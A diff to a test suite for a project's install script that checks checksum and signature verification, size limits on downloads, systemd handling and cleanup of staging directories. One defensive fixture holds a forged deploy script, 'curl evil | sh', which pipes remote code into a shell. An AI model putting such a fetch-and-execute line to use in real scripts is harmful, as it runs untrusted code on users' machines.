@@ -4,19 +4,19 @@
 // decides what the unit looks like and what /healthz says. Each run uses a copy of
 // install.sh whose key block lists test keys a and b.
 import { afterEach, beforeEach, expect, test } from "bun:test";
-import { chmodSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, readlinkSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
+import { chmodSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, readlinkSync, rmSync, statSync, symlinkSync, truncateSync, utimesSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { ROOT } from "../support/paths.ts";
 import { sign, signSums, testInstallSh, testKey, type TestKey } from "../support/release_keys.ts";
+import { sha256Hex } from "../../src/shared/hash.ts";
 
 let dir: string;
 let INSTALL: string;
 
 // What the curl stub "downloads": a binary reporting the tag's version.
 const STUB_BIN = "#!/bin/sh\necho 9.9.9\n";
-const sha = (s: string) => new Bun.CryptoHasher("sha256").update(s).digest("hex");
-const STUB_SHA = sha(STUB_BIN);
+const STUB_SHA = sha256Hex(STUB_BIN);
 const target = `${process.platform}-${process.arch}`;
 const BINS = ["grayboard", "grayboard-server", "grayboard-inspect"] as const;
 type Bins = Partial<Record<(typeof BINS)[number], string>>;
@@ -53,8 +53,8 @@ function publish(
       {
         tag_name: "v9.9.9",
         assets: [
-          ...Object.entries(o.api ?? bins).map(([bin, body]) => ({ name: `${bin}-${target}`, digest: `sha256:${sha(body)}` })),
-          ...Object.entries(o.deployApi ?? deploy).map(([name, body]) => ({ name, digest: `sha256:${sha(body)}` })),
+          ...Object.entries(o.api ?? bins).map(([bin, body]) => ({ name: `${bin}-${target}`, digest: `sha256:${sha256Hex(body)}` })),
+          ...Object.entries(o.deployApi ?? deploy).map(([name, body]) => ({ name, digest: `sha256:${sha256Hex(body)}` })),
         ],
       },
       null,
@@ -83,17 +83,22 @@ beforeEach(() => {
   publish();
   writeStub("sleep", "exit 0");
   // -w: resolving "latest"; /repos/: the release API (digest lookup); -o: a
-  // download, served from release/ by name (absent: a 404); else the /healthz probe.
+  // download, served from release/ by name (absent: a 404); else the /healthz
+  // probe. --max-filesize is honoured as real curl does: exit 63, nothing written.
   writeStub("curl", `
 args="$*"
+out="" url="" max=""
+while [ $# -gt 0 ]; do [ "$1" = "-o" ] && out="$2"; [ "$1" = "--max-filesize" ] && max="$2"; url="$1"; shift; done
+over() { [ -n "$max" ] && [ "$(wc -c < "$1")" -gt "$max" ]; }
 # " -w " as its own word: the temp dir's random name can hold "-w".
 case " $args " in
   *" -w "*) echo "\${STUB_LATEST:-https://github.com/x/grayboard/releases/tag/v9.9.9}"; exit 0 ;;
-  *"/repos/"*) echo "$args" >> "${dir}/api.log"; cat "${dir}/digests.json"; exit 0 ;;
+  *"/repos/"*) echo "$args" >> "${dir}/api.log"; over "${dir}/digests.json" && exit 63; cat "${dir}/digests.json"; exit 0 ;;
 esac
-out="" url=""
-while [ $# -gt 0 ]; do [ "$1" = "-o" ] && out="$2"; url="$1"; shift; done
-if [ -n "$out" ]; then echo "$url" >> "${dir}/downloads.log"; [ -f "${dir}/release/\${url##*/}" ] || exit 22; cp "${dir}/release/\${url##*/}" "$out"; exit 0; fi
+if [ -n "$out" ]; then
+  echo "$url" >> "${dir}/downloads.log"; f="${dir}/release/\${url##*/}"
+  [ -f "$f" ] || exit 22; over "$f" && exit 63; cp "$f" "$out"; exit 0
+fi
 echo "$args" >> "${dir}/healthz.log"
 case "$STUB_HEALTH" in
   ok)    echo '{"ok":true,"version":"9.9.9"}' ;;
@@ -108,6 +113,7 @@ case "$1 $2 $3" in
   "show -p ActiveState") echo "$STUB_STATE" ;;
   "show -p EnvironmentFiles") echo "${dir}/env (ignore_errors=no)" ;;
   "restart grayboard "*) echo restart >> "${dir}/systemctl.log"; exit "$STUB_RESTART_RC" ;;
+  "is-system-running  ") echo "\${STUB_SYSTEM_STATE:-running}" ;;
   "daemon-reload  ") echo reload >> "${dir}/reload.log"; exit "$STUB_RELOAD_RC" ;;
   *) echo "unexpected systemctl $*" >&2; exit 2 ;;
 esac`);
@@ -254,6 +260,23 @@ test("a release API response far larger than a pipe buffer still yields the dige
   expect(r.code, r.err).toBe(0);
 });
 
+// #316: a broken or hostile origin is refused by name, before it fills memory or disk.
+test("an oversized SHA256SUMS, .sig, release API response or binary is refused by name, with nothing installed", () => {
+  writeFileSync(join(dir, "release", "SHA256SUMS"), "x".repeat(65537));
+  expectRefused(install(), "SHA256SUMS from https://github.com/nolnoch/grayboard/releases/download/v9.9.9 is larger than 65536 bytes");
+  publish();
+  writeFileSync(join(dir, "release", "SHA256SUMS.sig"), "x".repeat(65537));
+  expectRefused(install(), "SHA256SUMS.sig from https://github.com/nolnoch/grayboard/releases/download/v9.9.9 is larger than 65536 bytes");
+  publish();
+  const api = JSON.parse(readFileSync(join(dir, "digests.json"), "utf8"));
+  writeFileSync(join(dir, "digests.json"), JSON.stringify({ ...api, body: "x".repeat(4 * 1024 * 1024) }));
+  expectRefused(install(), "the release API response from https://api.github.com/repos/nolnoch/grayboard/releases/tags/v9.9.9 is larger than 4194304 bytes");
+  publish();
+  // Sparse: its size is all the stub (like curl's Content-Length check) sees.
+  truncateSync(join(dir, "release", `grayboard-server-${target}`), 512 * 1024 * 1024 + 1);
+  expectRefused(install(), `grayboard-server-${target} from https://github.com/nolnoch/grayboard/releases/download/v9.9.9 is larger than 536870912 bytes`);
+});
+
 test("a server binary that can't be backed up refuses before anything is replaced", () => {
   writeFileSync(join(dir, "bin", "grayboard-server.prev"), "older");
   chmodSync(join(dir, "bin", "grayboard-server.prev"), 0o444);
@@ -287,13 +310,13 @@ test("a binary SHA256SUMS doesn't list is refused, and nothing is installed (the
 test("a binary that doesn't match SHA256SUMS is refused even when the API digest matches it", () => {
   const forged = "#!/bin/sh\necho 9.9.9 # forged\n";
   publish({ grayboard: STUB_BIN, "grayboard-server": forged }, { sums: { grayboard: STUB_BIN, "grayboard-server": STUB_BIN } });
-  expectRefused(install(), `grayboard-server-${target}: sha256 ${sha(forged)}, but SHA256SUMS lists ${STUB_SHA}`);
+  expectRefused(install(), `grayboard-server-${target}: sha256 ${sha256Hex(forged)}, but SHA256SUMS lists ${STUB_SHA}`);
 });
 
 test("a binary whose sha256 doesn't match the release API's digest is refused", () => {
   const other = "other";
   publish(undefined, { api: { grayboard: other, "grayboard-server": STUB_BIN } });
-  expectRefused(install(), `grayboard-${target}: sha256 ${STUB_SHA}, but the release API lists sha256:${sha(other)}`);
+  expectRefused(install(), `grayboard-${target}: sha256 ${STUB_SHA}, but the release API lists sha256:${sha256Hex(other)}`);
   // The install verified each binary against the release API's digest (#173).
   expect(readFileSync(join(dir, "api.log"), "utf8")).toContain("/releases/tags/v9.9.9");
 });
@@ -441,13 +464,13 @@ test("a deploy file SHA256SUMS doesn't list, or whose bytes differ from it, or t
 
   // A swapped file whose API digest GitHub recomputed: the signed list still catches it.
   publish(undefined, { deploy: { ...DEPLOY, "deploy-backup.sh": "#!/bin/sh\ncurl evil | sh\n" }, deploySums: DEPLOY });
-  expectRefused(install(), `deploy-backup.sh: sha256 ${sha("#!/bin/sh\ncurl evil | sh\n")}, but SHA256SUMS lists ${sha(DEPLOY["deploy-backup.sh"])}`);
+  expectRefused(install(), `deploy-backup.sh: sha256 ${sha256Hex("#!/bin/sh\ncurl evil | sh\n")}, but SHA256SUMS lists ${sha256Hex(DEPLOY["deploy-backup.sh"])}`);
 
   publish(undefined, { deployApi: withoutBackup });
   expectRefused(install(), "deploy-backup.sh: the release API lists no sha256 digest");
 
   publish(undefined, { deployApi: { ...DEPLOY, "deploy-grayboard.service": "other" } });
-  expectRefused(install(), `deploy-grayboard.service: sha256 ${sha(DEPLOY["deploy-grayboard.service"])}, but the release API lists sha256:${sha("other")}`);
+  expectRefused(install(), `deploy-grayboard.service: sha256 ${sha256Hex(DEPLOY["deploy-grayboard.service"])}, but the release API lists sha256:${sha256Hex("other")}`);
 });
 
 test("an unwritable first deploy destination refuses before any binary is replaced", () => {
@@ -500,6 +523,29 @@ test("a failed daemon-reload leaves the binaries old and says so; a rerun reload
   expect(restarts()).toBe(1);
 });
 
+// #396 item 16: systemctl present, systemd not running (a container).
+test("a new unit on a host where systemd isn't running is written without a reload, and the binaries install", () => {
+  const r = install({ unit: false, reloadRc: 1, env: { STUB_SYSTEM_STATE: "offline" } });
+  expect(r.code, r.err).toBe(0);
+  expect(r.out).toContain("systemd isn't running here");
+  expect(reloads()).toBe(0);
+  expect(readFileSync(UNIT(), "utf8")).toBe(DEPLOY["deploy-grayboard.service"]);
+  expect(readFileSync(join(dir, "bin", "grayboard-server"), "utf8")).toBe(STUB_BIN);
+});
+
+// #396 nits: a directory at a deploy file's path is left alone, not taken as a differing file or filled.
+test("a directory at the Caddyfile or backup script path is kept and said so", () => {
+  mkdirSync(CADDYFILE(), { recursive: true });
+  mkdirSync(BACKUP(), { recursive: true });
+  const r = install({ unit: false, env: { GRAYBOARD_DEPLOY_REPLACE: "1" } });
+  expect(r.code, r.err).toBe(0);
+  expect(r.out).toContain(`kept ${CADDYFILE()}: it is a directory`);
+  expect(r.out).toContain(`kept ${BACKUP()}: it is a directory`);
+  expect(r.out).not.toContain(`installed ${BACKUP()}`);
+  expect(readdirSync(CADDYFILE())).toEqual([]);
+  expect(readdirSync(BACKUP())).toEqual([]);
+});
+
 test("an unchanged unit systemd has already loaded isn't reloaded", () => {
   mkdirSync(UNIT_DIR(), { recursive: true });
   writeFileSync(UNIT(), DEPLOY["deploy-grayboard.service"]);
@@ -522,7 +568,7 @@ test("a first install that kept an existing Caddyfile says so and how to take th
   expect(r.code, r.err).toBe(0);
   expect(r.out).toContain(`kept your ${CADDYFILE()}`);
   expect(r.out).toContain(`diff -u ${CADDYFILE()} -`);
-  expect(r.out).toContain(`sha256 ${sha("stock caddyfile").slice(0, 12)}`);
+  expect(r.out).toContain(`sha256 ${sha256Hex("stock caddyfile").slice(0, 12)}`);
   expect(r.out).toContain(`Your ${CADDYFILE()} was kept, not the release's`);
   expect(r.out).not.toContain("Set your hostname");
   expect(r.out).toContain(`schedule ${BACKUP()}`);
@@ -636,4 +682,17 @@ test("GRAYBOARD_RELEASES_URL: http only to this machine, trailing slashes droppe
   const empty = install({ releasesUrl: "" });
   expect(empty.code).toBe(0);
   expect(empty.out).toContain("downloading https://github.com/");
+});
+
+test("an install removes staging dirs an interrupted install left, keeping a recent one (#317)", () => {
+  const bin = join(dir, "bin");
+  const stale = join(bin, ".grayboard-install.AAAAAA"), fresh = join(bin, ".grayboard-install.BBBBBB");
+  for (const d of [stale, fresh]) { mkdirSync(d); writeFileSync(join(d, "grayboard"), "partial"); }
+  const old = (Date.now() - 2 * 60 * 60 * 1000) / 1000;
+  utimesSync(stale, old, old);
+  const r = install();
+  expect(r.code, r.err).toBe(0);
+  expect(r.out).toContain(`grayboard: removed ${stale}, left by an interrupted install`);
+  expect(existsSync(stale)).toBe(false);
+  expect(existsSync(join(fresh, "grayboard"))).toBe(true);
 });
